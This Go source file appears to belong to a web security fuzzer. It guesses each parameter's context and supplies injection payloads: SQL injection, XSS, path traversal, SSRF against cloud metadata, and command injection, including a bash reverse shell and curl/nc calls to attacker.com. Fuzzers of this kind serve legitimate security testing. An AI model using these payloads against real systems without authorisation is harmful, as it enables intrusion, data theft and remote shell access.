package blitz

import (
	"fmt"
	"regexp"
	"strings"
)

// AIPayloadSelector generates contextually relevant payloads based on target analysis.
type AIPayloadSelector struct {
	config *AIPayloadConfig
}

// AIPayloadConfig configures AI payload generation behavior.
type AIPayloadConfig struct {
	// EnableContextAnalysis enables endpoint context analysis.
	EnableContextAnalysis bool

	// MaxPayloadsPerCategory limits payloads generated per vulnerability type.
	MaxPayloadsPerCategory int

	// EnableAdvancedPayloads includes more sophisticated attack vectors.
	EnableAdvancedPayloads bool

	// CustomPayloads allows users to add their own contextual payloads.
	CustomPayloads map[VulnCategory][]string
}

// VulnCategory represents a vulnerability category.
type VulnCategory string

const (
	VulnCategorySQLi        VulnCategory = "sqli"
	VulnCategoryXSS         VulnCategory = "xss"
	VulnCategoryCommandInj  VulnCategory = "command_injection"
	VulnCategoryPathTraversal VulnCategory = "path_traversal"
	VulnCategoryXXE         VulnCategory = "xxe"
	VulnCategorySSRF        VulnCategory = "ssrf"
	VulnCategoryIDOR        VulnCategory = "idor"
)

// TargetContext contains analyzed information about the fuzzing target.
type TargetContext struct {
	// URL path (e.g., "/api/user/profile")
	Path string

	// Parameter names and positions
	Parameters []ParameterInfo

	// Content-Type header
	ContentType string

	// HTTP method
	Method string

	// Inferred context (e.g., "database", "filesystem", "html_render")
	InferredContext []string
}

// ParameterInfo describes a single parameter being fuzzed.
type ParameterInfo struct {
	Name     string
	Position Position
	Location string // "query", "body", "header", "cookie", "path"
	Type     string // "string", "numeric", "boolean", "json", "xml"
}

// NewAIPayloadSelector creates a new AI-powered payload selector.
func NewAIPayloadSelector(config *AIPayloadConfig) *AIPayloadSelector {
	if config == nil {
		config = &AIPayloadConfig{
			EnableContextAnalysis:  true,
			MaxPayloadsPerCategory: 10,
			EnableAdvancedPayloads: true,
		}
	}

	if config.MaxPayloadsPerCategory <= 0 {
		config.MaxPayloadsPerCategory = 10
	}

	return &AIPayloadSelector{
		config: config,
	}
}

// AnalyzeTarget examines the request template to infer context.
func (s *AIPayloadSelector) AnalyzeTarget(request *Request) *TargetContext {
	ctx := &TargetContext{
		Parameters:      make([]ParameterInfo, len(request.Positions)),
		InferredContext: make([]string, 0),
	}

	// Extract path and method from raw request
	lines := strings.Split(request.Raw, "\n")
	if len(lines) > 0 {
		parts := strings.Fields(lines[0])
		if len(parts) >= 2 {
			ctx.Method = parts[0]
			ctx.Path = parts[1]
		}
	}

	// Extract Content-Type
	for _, line := range lines {
		if strings.HasPrefix(strings.ToLower(line), "content-type:") {
			ctx.ContentType = strings.TrimSpace(strings.TrimPrefix(line, "Content-Type:"))
			break
		}
	}

	// Analyze each parameter
	for i, pos := range request.Positions {
		param := ParameterInfo{
			Name:     pos.Name,
			Position: pos,
			Location: s.inferLocation(request.Raw, pos),
			Type:     s.inferType(pos.Name, pos.Default),
		}
		ctx.Parameters[i] = param
	}

	// Infer context from path and parameters
	ctx.InferredContext = s.inferContext(ctx)

	return ctx
}

// GeneratePayloads creates contextually relevant payloads.
func (s *AIPayloadSelector) GeneratePayloads(targetCtx *TargetContext, param ParameterInfo) []string {
	var allPayloads []string

	// Determine which vulnerability categories to test
	categories := s.selectCategories(targetCtx, param)

	for _, category := range categories {
		payloads := s.generateForCategory(category, targetCtx, param)
		if len(payloads) > s.config.MaxPayloadsPerCategory {
			payloads = payloads[:s.config.MaxPayloadsPerCategory]
		}
		allPayloads = append(allPayloads, payloads...)
	}

	// Add custom payloads
	if s.config.CustomPayloads != nil {
		for _, category := range categories {
			if custom, ok := s.config.CustomPayloads[category]; ok {
				allPayloads = append(allPayloads, custom...)
			}
		}
	}

	return allPayloads
}

// selectCategories determines which vulnerability types to test.
func (s *AIPayloadSelector) selectCategories(ctx *TargetContext, param ParameterInfo) []VulnCategory {
	categories := make([]VulnCategory, 0)

	// SQL injection candidates
	if s.likelySQLContext(ctx, param) {
		categories = append(categories, VulnCategorySQLi)
	}

	// XSS candidates
	if s.likelyHTMLContext(ctx, param) {
		categories = append(categories, VulnCategoryXSS)
	}

	// Command injection candidates
	if s.likelyCommandContext(ctx, param) {
		categories = append(categories, VulnCategoryCommandInj)
	}

	// Path traversal candidates
	if s.likelyFilesystemContext(ctx, param) {
		categories = append(categories, VulnCategoryPathTraversal)
	}

	// SSRF candidates
	if s.likelyURLContext(ctx, param) {
		categories = append(categories, VulnCategorySSRF)
	}

	// IDOR candidates
	if s.likelyIDContext(ctx, param) {
		categories = append(categories, VulnCategoryIDOR)
	}

	// If no specific context detected, test common vulnerabilities
	if len(categories) == 0 {
		categories = append(categories, VulnCategorySQLi, VulnCategoryXSS)
	}

	return categories
}

// likelySQLContext determines if parameter might interact with database.
func (s *AIPayloadSelector) likelySQLContext(ctx *TargetContext, param ParameterInfo) bool {
	dbIndicators := []string{
		"id", "user", "account", "search", "query", "filter",
		"name", "email", "login", "username", "order", "sort",
		"table", "column", "database", "db",
	}

	pathIndicators := []string{
		"/api/", "/query", "/search", "/users", "/accounts",
		"/data", "/records", "/list",
	}

	return matchesAnyIndicator(param.Name, dbIndicators) ||
		matchesAnyIndicator(ctx.Path, pathIndicators) ||
		contains(ctx.InferredContext, "database")
}

// likelyHTMLContext determines if parameter might be rendered in HTML.
func (s *AIPayloadSelector) likelyHTMLContext(ctx *TargetContext, param ParameterInfo) bool {
	htmlIndicators := []string{
		"comment", "message", "text", "content", "description",
		"title", "body", "post", "article", "name",
	}

	pathIndicators := []string{
		"/view", "/display", "/show", "/render", "/page",
	}

	contentTypeHTML := strings.Contains(strings.ToLower(ctx.ContentType), "html")

	return matchesAnyIndicator(param.Name, htmlIndicators) ||
		matchesAnyIndicator(ctx.Path, pathIndicators) ||
		contentTypeHTML ||
		contains(ctx.InferredContext, "html_render")
}

// likelyCommandContext determines if parameter might be used in system commands.
func (s *AIPayloadSelector) likelyCommandContext(ctx *TargetContext, param ParameterInfo) bool {
	commandIndicators := []string{
		"cmd", "command", "exec", "run", "execute", "system",
		"shell", "script", "process", "ping", "host",
	}

	pathIndicators := []string{
		"/exec", "/run", "/command", "/admin", "/system",
		"/ping", "/tool",
	}

	return matchesAnyIndicator(param.Name, commandIndicators) ||
		matchesAnyIndicator(ctx.Path, pathIndicators) ||
		contains(ctx.InferredContext, "system_call")
}

// likelyFilesystemContext determines if parameter might access filesystem.
func (s *AIPayloadSelector) likelyFilesystemContext(ctx *TargetContext, param ParameterInfo) bool {
	fileIndicators := []string{
		"file", "path", "filename", "dir", "directory", "folder",
		"upload", "download", "document", "attachment", "resource",
		"page", "template", "include",
	}

	pathIndicators := []string{
		"/file", "/download", "/upload", "/static", "/assets",
		"/document", "/resource", "/include",
	}

	return matchesAnyIndicator(param.Name, fileIndicators) ||
		matchesAnyIndicator(ctx.Path, pathIndicators) ||
		contains(ctx.InferredContext, "filesystem")
}

// likelyURLContext determines if parameter might be a URL.
func (s *AIPayloadSelector) likelyURLContext(ctx *TargetContext, param ParameterInfo) bool {
	urlIndicators := []string{
		"url", "uri", "link", "redirect", "callback", "webhook",
		"next", "return", "continue", "target", "destination",
	}

	return matchesAnyIndicator(param.Name, urlIndicators)
}

// likelyIDContext determines if parameter is an identifier (IDOR candidate).
func (s *AIPayloadSelector) likelyIDContext(ctx *TargetContext, param ParameterInfo) bool {
	idIndicators := []string{
		"id", "uid", "user_id", "account_id", "customer_id",
		"order_id", "invoice_id", "ref", "reference",
	}

	return matchesAnyIndicator(param.Name, idIndicators) &&
		param.Type == "numeric"
}

// generateForCategory generates payloads for a specific vulnerability category.
func (s *AIPayloadSelector) generateForCategory(category VulnCategory, ctx *TargetContext, param ParameterInfo) []string {
	switch category {
	case VulnCategorySQLi:
		return s.generateSQLiPayloads(ctx, param)
	case VulnCategoryXSS:
		return s.generateXSSPayloads(ctx, param)
	case VulnCategoryCommandInj:
		return s.generateCommandInjPayloads(ctx, param)
	case VulnCategoryPathTraversal:
		return s.generatePathTraversalPayloads(ctx, param)
	case VulnCategorySSRF:
		return s.generateSSRFPayloads(ctx, param)
	case VulnCategoryIDOR:
		return s.generateIDORPayloads(ctx, param)
	default:
		return nil
	}
}

// generateSQLiPayloads creates SQL injection test vectors.
func (s *AIPayloadSelector) generateSQLiPayloads(ctx *TargetContext, param ParameterInfo) []string {
	basic := []string{
		"'",
		"\"",
		"' OR '1'='1",
		"' OR 1=1--",
		"\" OR \"1\"=\"1",
		"' OR 1=1#",
		"admin' --",
		"admin' #",
		"1' AND '1'='1",
	}

	advanced := []string{
		"1' UNION SELECT NULL--",
		"1' UNION SELECT NULL,NULL--",
		"' UNION SELECT table_name FROM information_schema.tables--",
		"1' AND SLEEP(5)--",
		"1' AND 1=CONVERT(int, (SELECT @@version))--",
		"'; WAITFOR DELAY '0:0:5'--",
		"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
	}

	if s.config.EnableAdvancedPayloads {
		return append(basic, advanced...)
	}
	return basic
}

// generateXSSPayloads creates XSS test vectors.
func (s *AIPayloadSelector) generateXSSPayloads(ctx *TargetContext, param ParameterInfo) []string {
	basic := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"javascript:alert(1)",
		"'\"><script>alert(1)</script>",
	}

	advanced := []string{
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=x:alert(1) onerror=eval(src)>",
		"<svg><script>alert&#40;1)</script>",
		"<details open ontoggle=alert(1)>",
		"<marquee onstart=alert(1)>",
		"<body onload=alert(1)>",
		"\"><img src=x onerror=alert(1)//>",
	}

	if s.config.EnableAdvancedPayloads {
		return append(basic, advanced...)
	}
	return basic
}

// generateCommandInjPayloads creates command injection test vectors.
func (s *AIPayloadSelector) generateCommandInjPayloads(ctx *TargetContext, param ParameterInfo) []string {
	basic := []string{
		"; ls",
		"| ls",
		"& ls",
		"&& ls",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"`whoami`",
		"$(whoami)",
	}

	advanced := []string{
		"; curl http://attacker.com",
		"| nc attacker.com 4444",
		"; sleep 5",
		"& ping -c 5 127.0.0.1",
		"`curl http://attacker.com`",
		"$(curl http://attacker.com)",
		"; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
	}

	if s.config.EnableAdvancedPayloads {
		return append(basic, advanced...)
	}
	return basic
}

// generatePathTraversalPayloads creates path traversal test vectors.
func (s *AIPayloadSelector) generatePathTraversalPayloads(ctx *TargetContext, param ParameterInfo) []string {
	basic := []string{
		"../",
		"../../",
		"../../../",
		"../../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"C:\\windows\\win.ini",
	}

	advanced := []string{
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..;/..;/..;/etc/passwd",
		"/../../../etc/passwd%00",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
	}

	if s.config.EnableAdvancedPayloads {
		return append(basic, advanced...)
	}
	return basic
}

// generateSSRFPayloads creates SSRF test vectors.
func (s *AIPayloadSelector) generateSSRFPayloads(ctx *TargetContext, param ParameterInfo) []string {
	basic := []string{
		"http://localhost",
		"http://127.0.0.1",
		"http://169.254.169.254",
		"http://[::1]",
		"http://0.0.0.0",
	}

	advanced := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://localhost:22",
		"http://127.0.0.1:3306",
		"file:///etc/passwd",
		"dict://127.0.0.1:11211/stats",
		"gopher://127.0.0.1:25/",
	}

	if s.config.EnableAdvancedPayloads {
		return append(basic, advanced...)
	}
	return basic
}

// generateIDORPayloads creates IDOR test vectors.
func (s *AIPayloadSelector) generateIDORPayloads(ctx *TargetContext, param ParameterInfo) []string {
	// Generate IDs around common values
	return []string{
		"1", "2", "3", "10", "100", "1000",
		"0", "-1", "9999", "admin", "root",
	}
}

// Helper functions

func (s *AIPayloadSelector) inferLocation(raw string, pos Position) string {
	// Check if in URL (first line)
	lines := strings.Split(raw, "\n")
	if len(lines) > 0 && strings.Contains(lines[0], pos.Name) {
		if strings.Contains(lines[0], "?") {
			return "query"
		}
		return "path"
	}

	// Check if in headers
	for i, line := range lines {
		if i == 0 {
			continue
		}
		if strings.TrimSpace(line) == "" {
			break
		}
		if strings.Contains(line, pos.Name) {
			if strings.Contains(strings.ToLower(line), "cookie") {
				return "cookie"
			}
			return "header"
		}
	}

	return "body"
}

func (s *AIPayloadSelector) inferType(name, value string) string {
	// Check if numeric
	if regexp.MustCompile(`^\d+$`).MatchString(value) {
		return "numeric"
	}

	// Check if boolean
	lower := strings.ToLower(value)
	if lower == "true" || lower == "false" {
		return "boolean"
	}

	// Check if JSON
	if strings.HasPrefix(value, "{") || strings.HasPrefix(value, "[") {
		return "json"
	}

	// Check if XML
	if strings.HasPrefix(value, "<") {
		return "xml"
	}

	return "string"
}

func (s *AIPayloadSelector) inferContext(ctx *TargetContext) []string {
	contexts := make([]string, 0)

	// Analyze path
	pathLower := strings.ToLower(ctx.Path)

	if matchesAnyIndicator(pathLower, []string{"/api/", "/query", "/search", "/data"}) {
		contexts = append(contexts, "database")
	}

	if matchesAnyIndicator(pathLower, []string{"/view", "/render", "/page", "/display"}) {
		contexts = append(contexts, "html_render")
	}

	if matchesAnyIndicator(pathLower, []string{"/file", "/download", "/upload", "/static"}) {
		contexts = append(contexts, "filesystem")
	}

	if matchesAnyIndicator(pathLower, []string{"/exec", "/run", "/command", "/admin/system"}) {
		contexts = append(contexts, "system_call")
	}

	return contexts
}

func matchesAnyIndicator(text string, indicators []string) bool {
	textLower := strings.ToLower(text)
	for _, indicator := range indicators {
		if strings.Contains(textLower, strings.ToLower(indicator)) {
			return true
		}
	}
	return false
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// CreateAIPayloadGenerator creates a PayloadGenerator from AI analysis.
func CreateAIPayloadGenerator(selector *AIPayloadSelector, request *Request) []PayloadGenerator {
	targetCtx := selector.AnalyzeTarget(request)

	generators := make([]PayloadGenerator, 0, len(request.Positions))

	for _, pos := range request.Positions {
		param := ParameterInfo{
			Name:     pos.Name,
			Position: pos,
		}

		// Find matching parameter info
		for _, p := range targetCtx.Parameters {
			if p.Position.Index == pos.Index {
				param = p
				break
			}
		}

		payloads := selector.GeneratePayloads(targetCtx, param)

		gen := NewStaticGenerator(
			fmt.Sprintf("AI:%s", pos.Name),
			payloads,
		)

		generators = append(generators, gen)
	}

	return generators
}
